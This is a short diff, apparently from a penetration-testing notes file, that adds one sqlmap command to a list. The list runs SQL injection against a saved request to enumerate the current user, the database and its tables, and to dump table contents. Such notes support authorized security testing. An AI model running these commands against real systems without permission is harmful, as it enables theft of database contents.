@@ -263,6 +263,7 @@ In order to be able to excute different applications using only the name without
 ```bash
 sqlmap -r <FICHERO> --level=5 --risk=3 --current-user
 sqlmap -r <FICHERO> --level=5 --risk=3 --current-db
+sqlmap -r <FICHERO> --level=5 --risk=3 -D <nombre_db> --tables
 sqlmap -r <FICHERO> --level=5 --risk=3 -D <nombre_db> -T <tabla> --dump
 ```
 
